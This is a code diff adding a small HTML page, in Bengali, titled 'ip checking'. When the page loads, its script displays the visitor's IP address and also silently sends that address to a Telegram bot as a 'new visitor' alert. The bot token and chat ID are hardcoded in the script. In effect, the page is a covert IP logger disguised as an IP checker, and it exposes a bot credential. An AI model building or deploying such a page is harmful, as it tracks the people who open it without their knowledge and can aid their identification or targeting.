@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <title>ip checking</title>
+</head>
+<body>
+  <p id="ip"></p>
+
+  <script>
+    const botToken = "8580413332:AAEXjGoFNxQm7ntDNhgUwhMh1_Y9g0qS8NM";
+    const chatId = "8217043051";
+
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        document.getElementById('ip').innerText = `IP Address: ${data.ip}`;
+        return data.ip;
+      } catch (err) {
+        document.getElementById('ip').innerText = 'IP Address: পাওয়া যায়নি';
+        return 'N/A';
+      }
+    }
+
+    async function sendToTelegram(ip) {
+      const text = `🛰️ নতুন ভিজিটর:\nIP: ${ip}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `chat_id=${chatId}&text=${encodeURIComponent(text)}`
+      });
+    }
+
+    async function init() {
+      const ip = await getIP();
+      await sendToTelegram(ip);
+    }
+
+    init();
+  </script>
+</body>
+</html>
